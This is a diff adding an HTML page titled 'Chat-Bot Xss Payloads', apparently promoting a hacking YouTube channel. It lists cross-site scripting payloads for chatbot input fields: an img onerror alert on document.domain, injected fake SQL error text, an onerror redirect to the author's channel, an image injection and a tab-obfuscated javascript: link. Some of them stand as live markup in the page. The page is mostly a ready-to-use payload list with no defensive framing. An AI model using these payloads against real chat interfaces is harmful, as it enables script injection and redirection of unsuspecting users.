@@ -1,0 +1,31 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chat-Bot Xss Payloads</title>
+    <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+    <div class="container">
+        <p>Basic XSS:
+       |
+       |_ "&gt;<img src=x onerror=alert(document.domain) ></p>
+<p>ERROR based injection :
+                   |
+                   |_ '<font color="red">ERROR 1064 (42000): Rohith had made an error in your Search Field;.jpg'</p>
+<p>Open Redirect : SUBSCRIBE , LIKE &amp; SHARE
+          |
+          |_ "&gt;<img src=x onerror="window.location.href='https://www.youtube.com/@hackwithrohit-new-2k';"></p>
+<p>IMAGE INJECTION :
+            |
+            |_ <img src=https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif ></p>
+<pre><code>           "&gt;&lt;img src=https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif &gt;
+</code></pre>
+<p>CONSOLE LOG :
+         |
+         |_ <a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:console.log(1337)">XSS</a></p>
+    </div>
+</body>
+</html>
